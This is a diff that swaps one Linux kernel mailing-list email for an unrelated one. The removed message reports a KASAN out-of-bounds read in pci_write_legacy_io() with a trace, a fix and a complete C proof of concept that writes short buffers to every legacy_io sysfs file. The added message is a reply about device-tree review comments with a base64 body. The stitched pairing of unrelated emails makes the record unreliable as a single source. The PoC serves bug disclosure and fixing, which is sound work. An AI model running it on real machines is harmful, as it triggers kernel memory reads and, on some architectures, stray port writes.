@@ -1,198 +1,103 @@
-Received: from out203-205-221-209.mail.qq.com (out203-205-221-209.mail.qq.com [203.205.221.209])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 627223D25C8
-	for <sashiko-reviews@lists.linux.dev>; Mon, 15 Jun 2026 09:01:01 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.209
+Received: from azure-sdnproxy.icoremail.net (azure-sdnproxy.icoremail.net [13.75.44.102])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id BEA8A2FFF8D
+	for <sashiko-reviews@lists.linux.dev>; Mon, 15 Jun 2026 09:08:54 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=13.75.44.102
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781514067; cv=none; b=HVsoFwA2jGgIanGYKQIYOzJL4f1Dt2rrOxUggnhp4bWWn7qysPp5kOPlch5pAbleO3wNr0isUzZ5FmMeic11KNhK203GxJU4N7jKX9uhchVj/cVZMVZ1yBvFp02XH9HR7YRGEGlXLfc2DKJgiPPlio4SXzh9wbd7jTpNnd0Chh4=
+	t=1781514538; cv=none; b=drWC0DIcBvkeRR0ntE1RJAQh6mEhWmH1+KbrHShS6mdgnva8amasQ5PtLILz9ovoEV7XudtVyIODNQpL9rensBpptXnmZSEKVfIoiqoBbTVCCjeeij1dN98SILQ0JXgzmewnjguI8x6Yp1PLAYlN6PKphOMrptQXMoUgzrK/cBU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781514067; c=relaxed/simple;
-	bh=BiRIk36aRlgFDld8cOjUwMutvWofMNuCgJoHAAmiKOY=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=KqVzBJL+HQjXNbeA+KLkBHVbp4dFnAgnCtsQ+qPXKINidmmsJIKwV1B55h8N2Mw/A+be5dBpIMMZmnx3DiU7pNe8KMyHubNSjBKP+mADXRLZxDgeXoF4heXxDb3RB/0HiaW7AYJxgPBPLpT0hhIVbZm/p/tSnhk4f+qUDpfdopk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=PuA2Efmq; arc=none smtp.client-ip=203.205.221.209
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="PuA2Efmq"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1781514052; bh=bAQXwn+qC2akO+xZ226TuyCtpNl+On4M2U4hUu2Wv5s=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=PuA2Efmq6JCJfc9v5O4uRAQXigWfr83lvZk+axCjdHGn9QdyekaTmYeOdWdI9wcmJ
-	 AFot0R7oeqCF4HHHl6WKabbikVnxJFxAdptZb+K612hfxOJDv4eH1xqKVog5aunIiX
-	 p340C8UE4xS2uwq5maJn9cTGS5xXpNxAw+Wd4ukE=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszb51-1.qq.com (NewEsmtp) with SMTP
-	id 3200ED8; Mon, 15 Jun 2026 17:00:50 +0800
-X-QQ-mid: xmsmtpt1781514050t7m0f2qpe
-Message-ID: <tencent_F4321A5EB5642AE407C42238ACC61714BB07@qq.com>
-X-QQ-XMAILINFO: NEGqkzgyFYqOy21RODdbG9rlTKPhvd5gsUs6LBSSBCrK5iSQB9W0YUtLtY942o
-	 Xx2+g7fM3JeSPbuezl4+RgOxTXMr4oLZAJbW/S8OU8v6z/uCG5jYtt9x00vqf6YDGCsSe8uCXxkY
-	 AOJ+oDOcBeeLE4aK7OfNQn7VGlLStG1yJ8mJZvk0BEUV8+Q6rGThJBuHflbso4jOehsKcnqWMpCh
-	 FA2LifYm0UZ/h+NpTIFRSqrCGoEImfwwk3ItFqulb9bi7VpqHP3OrtRrUFyvuOjJD4upB3BhyByF
-	 sjIALlw/zeUWprU9ErHshGnM2paleEWNxqa8KZWmkZzloUBsLSb8OVJ9e51ckgAx+zpb6r5mG2WE
-	 25+Y+XUIl/p+mz2azsulUUFjNS/YKudEg+i+MlMxEZkriyyMJ6RCAckaBgxBb7nXevctQ6WOaKAC
-	 Ro4iZI6h+nAy0Ha7yJFyd9AfFlPd2gRIPwvOpQ6127SwNcqawXBMNGMPRLzckmVAZHFMuUVDlYKS
-	 p37EA8Bxx6f/8dYos6/TKZzuFr1CKy9z/bs+ZoD28zSn+8yT1u91pzD6RY7rtOYDL2Rm4qX5SsIU
-	 ZENFA2N8dCGai4bIPaWm8+fcVgwHOKRWRuYX3kJdiy4mTGD1MbA/4XErUdKrze7oNfZygCBgtRZo
-	 d2F+eYHbnUbY0m4Zr2iAVrPgZFRNPRv1Mj7UWoOyk9wiVgjXEqyx+5jfYGBFP964XQfpZ0tBoQ2Y
-	 ajZsROIfpvggGeBP2onGgxo1erdy2317r14OrlLGNQLpMGhTQEqyASuQh958B9X8snRi1/FGh10h
-	 tdZbV9Gh4a4xad5u68Vt8pReKhvCDC9LzjRi9IfFsE/JO7vMUPYjH2/xSLXnloyCt8slIXE/jEMN
-	 4rO8W2hYfkenYXOPRTPBZcESl7VxDGYuY4caSISkf2neAA5fwZBzcXD7DBQj3BtA9Qoi8G0LAAAm
-	 IHJQ0xTynwV2QP/CALzqFiHBm9b1Zjdixgbez9sTLCDZoYim0HttqzwFmljP2JUnN6tFvL5X+Lcv
-	 lTvuuRcFO5c9FtwvLoem53Q4Z0kvaB5PNhUSRI6g==
-X-QQ-XMRINFO: M/715EihBoGS47X28/vv4NpnfpeBLnr4Qg==
-X-OQ-MSGID: <74d2da68-a1f1-484d-8ba4-95d2d224e81c@qq.com>
-Date: Mon, 15 Jun 2026 17:00:49 +0800
+	s=arc-20240116; t=1781514538; c=relaxed/simple;
+	bh=3eAaKq0DRhnOArpoc3MHZ0x/2bcD2End1NmsemJGrf8=;
+	h=Date:From:To:Cc:Subject:In-Reply-To:References:Content-Type:
+	 MIME-Version:Message-ID; b=ekuKgd0IdEVmuJ8V1Lzvaxy7geSt91bqFuGB6GVbSyJJvC/38x3jyKaXJLUZDKqQv6ebLlDgYXaECQk9Sk0BXPxrFiYWruzwtks5GjDu0KaJ0DoXemXmnZaglWfWikbERByNjsD63Gob5SCdUQ1cJeQ23MxX14ibjDCNli9bx7A=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=eswincomputing.com; spf=pass smtp.mailfrom=eswincomputing.com; arc=none smtp.client-ip=13.75.44.102
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=eswincomputing.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=eswincomputing.com
+Received: from lizhi2$eswincomputing.com ( [10.11.96.26] ) by
+ ajax-webmail-app1 (Coremail) ; Mon, 15 Jun 2026 17:08:52 +0800 (GMT+08:00)
+Date: Mon, 15 Jun 2026 17:08:52 +0800 (GMT+08:00)
+X-CM-HeaderCharset: UTF-8
+From: =?UTF-8?B?5p2O5b+X?= <lizhi2@eswincomputing.com>
+To: sashiko-reviews@lists.linux.dev
+Cc: conor+dt@kernel.org, devicetree@vger.kernel.org, robh@kernel.org
+Subject: Re: Re: [PATCH net-next v8 6/6] riscv: dts: eswin:
+ eic7700-hifive-premier-p550: enable Ethernet controller
+X-Priority: 3
+X-Mailer: Coremail Webmail Server Version 2024.2-cmXT6 build
+ 20241203(6b039d88) Copyright (c) 2002-2026 www.mailtech.cn
+ mispb-72143050-eaf5-4703-89e0-86624513b4ce-eswincomputing.com
+In-Reply-To: <20260611013250.985401F00898@smtp.kernel.org>
+References: <20260610013223.972-1-lizhi2@eswincomputing.com>
+ <20260611013250.985401F00898@smtp.kernel.org>
+Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset=UTF-8
 Precedence: bulk
 X-Mailing-List: sashiko-reviews@lists.linux.dev
 List-Id: <sashiko-reviews.lists.linux.dev>
 List-Subscribe: <mailto:sashiko-reviews+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:sashiko-reviews+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH] alpha/PCI: Fix I/O port accessor argument order in
- pci_legacy_write()
-To: =?UTF-8?Q?Krzysztof_Wilczy=C5=84ski?= <kwilczynski@kernel.org>,
- sashiko-reviews@lists.linux.dev
-Cc: linux-pci@vger.kernel.org
-References: <20260612232400.585195-1-kwilczynski@kernel.org>
- <20260612233426.B7EFD1F000E9@smtp.kernel.org>
- <20260613151251.GB3086320@rocinante>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260613151251.GB3086320@rocinante>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+Message-ID: <1691b864.9610.19eca8a775c.Coremail.lizhi2@eswincomputing.com>
+X-Coremail-Locale: en_US
+X-CM-TRANSID:TAJkCgDHW3AkwS9qfeUoAA--.7707W
+X-CM-SenderInfo: xol2xx2s6h245lqf0zpsxwx03jof0z/1tbiAgETDGou2BZoiwABs0
+X-Coremail-Antispam: 1Ur529EdanIXcx71UUUUU7IcSsGvfJ3iIAIbVAYjsxI4VWxJw
+	CS07vEb4IE77IF4wCS07vE1I0E4x80FVAKz4kxMIAIbVAFxVCaYxvI4VCIwcAKzIAtYxBI
+	daVFxhVjvjDU=
 
-Hi Krzysztof,
-
-Following up on the Sashiko review that pointed out the `*(u32 *)buf`
-issue in pci_write_legacy_io() — I wrote a small PoC to confirm it on
-x86 with HAVE_PCI_LEGACY enabled for testing.
-
-As expected, writing 1 byte to `/sys/devices/pci*/legacy_io` reliably
-triggers a KASAN slab-out-of-bounds read in pci_write_legacy_io():
-
-   ==================================================================
-   BUG: KASAN: slab-out-of-bounds in pci_write_legacy_io+0xb5/0xc0
-   Read of size 4 at addr ffff888107c8ed88 by task bash/9528
-
-   Call Trace:
-    pci_write_legacy_io+0xb5/0xc0          <-- *(u32 *)buf
-    sysfs_kf_bin_write+0x17c/0x1f0
-    kernfs_fop_write_iter+0x3a4/0x580
-    vfs_write+0x7e1/0x11b0
-    ksys_write+0x12f/0x250
-    ...
-
-   Allocated by task 9528:
-    kernfs_fop_write_iter+0x22c/0x580       <-- kmalloc(2) for 1-byte write
-    ...
-
-   The buggy address is located 0 bytes inside of
-    allocated 2-byte region [ffff888107c8ed88, ffff888107c8ed8a)
-
-The kernel at line 921 in drivers/pci/pci-sysfs.c:
-
- >    return pci_legacy_write(bus, off, *(u32 *)buf, count);
-
-unconditionally reads 4 bytes, but kernfs only allocated count+1 bytes
-(2 bytes for a 1-byte write).  The upper bytes of val get populated
-with uninitialized heap data, as the Sashiko review noted.
-
-On x86 this is "just" a KASAN splat since outb() truncates to the
-lowest byte, but on PowerPC where pci_legacy_write() does
-`out_8(addr, val >> 24)`, the garbage bytes would actually hit the I/O
-port.
-
-Hope the PoC helps.  Patch for pci_write_legacy_io() would be:
-
---- a/drivers/pci/pci-sysfs.c
-+++ b/drivers/pci/pci-sysfs.c
-@@ -918,7 +918,19 @@ static ssize_t pci_write_legacy_io(struct file 
-*filp, struct kobject *kobj,
-      if (count != 1 && count != 2 && count != 4)
-          return -EINVAL;
-
--    return pci_legacy_write(bus, off, *(u32 *)buf, count);
-+    u32 val = 0;
-+    memcpy(&val, buf, count);
-+    return pci_legacy_write(bus, off, val, count);
-  }
-
-Thanks,
-Xiao
-
----8<--- poc.c ---
-/*
-  * PoC: KASAN slab-out-of-bounds in pci_write_legacy_io()
-  *
-  * drivers/pci/pci-sysfs.c unconditionally dereferences *(u32 *)buf
-  * regardless of count (1, 2, or 4).  Write 1 byte to legacy_io to
-  * trigger a 4-byte read from a 2-byte kmalloc buffer.
-  *
-  * Build:  gcc -Wall -O2 -o poc poc.c
-  * Run:    ./poc   (KASAN-enabled kernel with HAVE_PCI_LEGACY)
-  */
-
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <dirent.h>
-#include <linux/limits.h>
-
-static int try_write(const char *dirname, const char *buf, size_t count)
-{
-     char path[PATH_MAX];
-     struct stat st;
-     int fd;
-
-     snprintf(path, sizeof(path), "/sys/devices/%s/legacy_io", dirname);
-     if (stat(path, &st) < 0) return -1;
-     fd = open(path, O_WRONLY);
-     if (fd < 0) return -1;
-
-     ssize_t ret = write(fd, buf, count);
-     printf("  %s (%zu bytes): %s\n", path, count,
-            ret < 0 ? strerror(errno) : "ok");
-     close(fd);
-     return ret >= 0 ? 0 : -1;
-}
-
-int main(void)
-{
-     DIR *dir = opendir("/sys/devices/");
-     struct dirent *entry;
-     int found = 0;
-
-     if (!dir) { perror("opendir"); return 1; }
-
-     printf("PoC: pci_write_legacy_io() slab-out-of-bounds\n\n");
-     while ((entry = readdir(dir))) {
-         if (strncmp(entry->d_name, "pci", 3)) continue;
-         printf("Found: %s\n", entry->d_name);
-
-         /* 1-byte write: kmalloc(2) → *(u32 *) reads 4 bytes */
-         if (try_write(entry->d_name, "\x01", 1) == 0) found++;
-         /* 2-byte write: kmalloc(3) → *(u32 *) reads 4 bytes */
-         if (try_write(entry->d_name, "\x01\x02", 2) == 0) found++;
-     }
-     closedir(dir);
-
-     if (!found) {
-         printf("\nNo legacy_io files.  Kernel likely lacks 
-HAVE_PCI_LEGACY.\n");
-         return 1;
-     }
-     printf("\nDone.  Check dmesg for KASAN report.\n");
-     return 0;
-}
-
-
+CgoKPiAtLS0tLU9yaWdpbmFsIE1lc3NhZ2VzLS0tLS0KPiBGcm9tOiBzYXNoaWtvLWJvdEBrZXJu
+ZWwub3JnCj4gU2VuZCB0aW1lOlRodXJzZGF5LCAxMS8wNi8yMDI2IDA5OjMyOjUwCj4gVG86IGxp
+emhpMkBlc3dpbmNvbXB1dGluZy5jb20KPiBDYzogY29ub3IrZHRAa2VybmVsLm9yZywgZGV2aWNl
+dHJlZUB2Z2VyLmtlcm5lbC5vcmcsIHJvYmhAa2VybmVsLm9yZwo+IFN1YmplY3Q6IFJlOiBbUEFU
+Q0ggbmV0LW5leHQgdjggNi82XSByaXNjdjogZHRzOiBlc3dpbjogZWljNzcwMC1oaWZpdmUtcHJl
+bWllci1wNTUwOiBlbmFibGUgRXRoZXJuZXQgY29udHJvbGxlcgo+IAo+IFRoYW5rIHlvdSBmb3Ig
+eW91ciBjb250cmlidXRpb24hIFNhc2hpa28gQUkgcmV2aWV3IGZvdW5kIDIgcG90ZW50aWFsIGlz
+c3VlKHMpIHRvIGNvbnNpZGVyOgo+IC0gW0xvd10gRGV2aWNlIFRyZWUgY29tcGlsZXIgd2Fybmlu
+ZzogdW5pdCBhZGRyZXNzIHdpdGhvdXQgYHJlZ2AgcHJvcGVydHkuCj4gLSBbTG93XSBEZXZpY2Ug
+VHJlZSBzY2hlbWEgdmFsaWRhdGlvbiB3YXJuaW5nczogbm9uLXN0YW5kYXJkIG5vZGUgbmFtZXMu
+Cj4gLS0KPiAKPiBjb21taXQgNjFmZTg3YjJhZjMzYTg5YzY1MzFkMGQ3ZWM4ZjQ5ODk5YTUyMDU3
+ZQo+IEF1dGhvcjogWmhpIExpIDxsaXpoaTJAZXN3aW5jb21wdXRpbmcuY29tPgo+IAo+IHJpc2N2
+OiBkdHM6IGVzd2luOiBlaWM3NzAwLWhpZml2ZS1wcmVtaWVyLXA1NTA6IGVuYWJsZSBFdGhlcm5l
+dCBjb250cm9sbGVyCj4gICAgIAo+IEVuYWJsZSB0aGUgb24tYm9hcmQgR2lnYWJpdCBFdGhlcm5l
+dCBjb250cm9sbGVyIG9uIHRoZQo+IEhpRml2ZSBQcmVtaWVyIFA1NTAgZGV2ZWxvcG1lbnQgYm9h
+cmQuCj4gCj4gPiBkaWZmIC0tZ2l0IGEvYXJjaC9yaXNjdi9ib290L2R0cy9lc3dpbi9laWM3NzAw
+LWhpZml2ZS1wcmVtaWVyLXA1NTAuZHRzIGIvYXJjaC9yaXNjdi9ib290L2R0cy9lc3dpbi9laWM3
+NzAwLWhpZml2ZS1wcmVtaWVyLXA1NTAuZHRzCj4gPiBpbmRleCAxMzFlZDFmYzZiMmVkLi5lZGQ5
+MWIwNGUyNTE1IDEwMDY0NAo+ID4gLS0tIGEvYXJjaC9yaXNjdi9ib290L2R0cy9lc3dpbi9laWM3
+NzAwLWhpZml2ZS1wcmVtaWVyLXA1NTAuZHRzCj4gPiArKysgYi9hcmNoL3Jpc2N2L2Jvb3QvZHRz
+L2Vzd2luL2VpYzc3MDAtaGlmaXZlLXByZW1pZXItcDU1MC5kdHMKPiA+IEBAIC0xMywxMSArMTMs
+MjUxIEBAIC8gewo+IAo+IFsgLi4uIF0KPiAKPiA+ICAJY2hvc2VuIHsKPiA+ICAJCXN0ZG91dC1w
+YXRoID0gInNlcmlhbDA6MTE1MjAwbjgiOwo+ID4gIAl9Owo+ID4gKwo+ID4gKwl2Y2NfMXY4OiB2
+Y2Mxdjggewo+ICAgICAgICAgICAgICAgICAgXl5eXl5eCj4gW1NldmVyaXR5OiBMb3ddCj4gU2hv
+dWxkIHRoaXMgbm9kZSBiZSBuYW1lZCB1c2luZyB0aGUgZ2VuZXJpYyByZWd1bGF0b3ItKiBwYXR0
+ZXJuLCBzdWNoIGFzCj4gcmVndWxhdG9yLTF2OD8gVGhlIGN1cnJlbnQgbmFtZSBtaWdodCB0cmln
+Z2VyIGR0YnNfY2hlY2sgdmFsaWRhdGlvbiB3YXJuaW5ncwo+IGZvciB0aGUgZml4ZWQtcmVndWxh
+dG9yIHNjaGVtYS4KPiAKPiA+ICsJCSBjb21wYXRpYmxlID0gInJlZ3VsYXRvci1maXhlZCI7Cj4g
+PiArCQkgcmVndWxhdG9yLW5hbWUgPSAidmNjMXY4IjsKPiA+ICsJCSByZWd1bGF0b3ItYWx3YXlz
+LW9uOwo+IAo+IFsgLi4uIF0KPiAKPiA+IGRpZmYgLS1naXQgYS9hcmNoL3Jpc2N2L2Jvb3QvZHRz
+L2Vzd2luL2VpYzc3MDAuZHRzaSBiL2FyY2gvcmlzY3YvYm9vdC9kdHMvZXN3aW4vZWljNzcwMC5k
+dHNpCj4gPiBpbmRleCBjM2VkOTMwMDhiY2ExLi5jNzdiYzhiMWI3YmMwIDEwMDY0NAo+ID4gLS0t
+IGEvYXJjaC9yaXNjdi9ib290L2R0cy9lc3dpbi9laWM3NzAwLmR0c2kKPiA+ICsrKyBiL2FyY2gv
+cmlzY3YvYm9vdC9kdHMvZXN3aW4vZWljNzcwMC5kdHNpCj4gCj4gWyAuLi4gXQo+IAo+ID4gQEAg
+LTIwMiw2ICsyMDUsMTEgQEAgcG11IHsKPiA+ICAJCQkJPDB4MDAwMDAwMDAgMHgwMDAwMDAwZiAw
+eGZmZmZmZmZjIDB4MDAwMDAwZmYgMHgwMDAwMDA3OD47Cj4gPiAgCX07Cj4gPiAgCj4gPiArCXh0
+YWwyNG06IG9zY2lsbGF0b3Igewo+ICAgICAgICAgICAgICAgICAgXl5eXl5eXl5eXgo+IFtTZXZl
+cml0eTogTG93XQo+IFdvdWxkIGl0IGJlIGJldHRlciB0byB1c2UgdGhlIGdlbmVyaWMgY2xvY2st
+KiBwYXR0ZXJuIGZvciB0aGlzIG5vZGUgbmFtZSwKPiBzdWNoIGFzIGNsb2NrLTI0bT8gVXNpbmcg
+b3NjaWxsYXRvciBtaWdodCB0cmlnZ2VyIGR0YnNfY2hlY2sgd2FybmluZ3MKPiBhZ2FpbnN0IHRo
+ZSBmaXhlZC1jbG9jayBiaW5kaW5nIHNjaGVtYS4KPiAKPiA+ICsJCWNvbXBhdGlibGUgPSAiZml4
+ZWQtY2xvY2siOwo+ID4gKwkJI2Nsb2NrLWNlbGxzID0gPDA+Owo+ID4gKwl9Owo+ID4gKwo+ID4g
+IAlzb2Mgewo+ID4gIAkJY29tcGF0aWJsZSA9ICJzaW1wbGUtYnVzIjsKPiA+ICAJCXJhbmdlczsK
+PiA+IEBAIC0yNDUsNiArMjUzLDg1IEBAIHBsaWM6IGludGVycnVwdC1jb250cm9sbGVyQGMwMDAw
+MDAgewo+ID4gIAkJCSNpbnRlcnJ1cHQtY2VsbHMgPSA8MT47Cj4gPiAgCQl9Owo+ID4gIAo+ID4g
+KwkJaHNwX3Bvd2VyX2RvbWFpbjogYnVzQDUwNDAwMDAwIHsKPiAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgXl5eXl5eXl5eXl5eCj4gW1NldmVyaXR5OiBMb3ddCj4gRG9lcyB0aGlz
+IG5vZGUgbmVlZCBhIHJlZyBwcm9wZXJ0eT8gSXQgaGFzIGEgdW5pdCBhZGRyZXNzIChANTA0MDAw
+MDApLCB3aGljaAo+IHVzdWFsbHkgcmVxdWlyZXMgYSBtYXRjaGluZyByZWcgcHJvcGVydHkuIFdp
+dGhvdXQgaXQsIHRoZSBkZXZpY2V0cmVlIGNvbXBpbGVyCj4gbWlnaHQgZ2VuZXJhdGUgYSB1bml0
+X2FkZHJlc3NfdnNfcmVnIHdhcm5pbmcuCj4gCj4gPiArCQkJY29tcGF0aWJsZSA9ICJzaW1wbGUt
+cG0tYnVzIjsKPiA+ICsJCQlyYW5nZXM7Cj4gPiArCQkJY2xvY2tzID0gPCZjbGsgMTcxPjsKPiA+
+ICsJCQkjYWRkcmVzcy1jZWxscyA9IDwyPjsKPiA+ICsJCQkjc2l6ZS1jZWxscyA9IDwyPjsKPiAK
+SXQncyBvbmx5IGZvciB0aGUgcmV2aWV3ZXIgdG8gZ2V0IGEgZnVsbCBwaWN0dXJlIG9mIHRoZSBk
+dHMuIEl0IHdpbGwgTk9UIGJlIHVwc3RyZWFtZWQuCkFzIG1lbnRpb25lZCBieSBBbmRyZXcgTHVu
+biBhdDoKaHR0cHM6Ly9sb3JlLmtlcm5lbC5vcmcvbGttbC82NGJmNmI0MC1iOTQ3LTRmZmEtOGQ0
+OC00ZDYzNDE5MzEzMjdAbHVubi5jaC8K
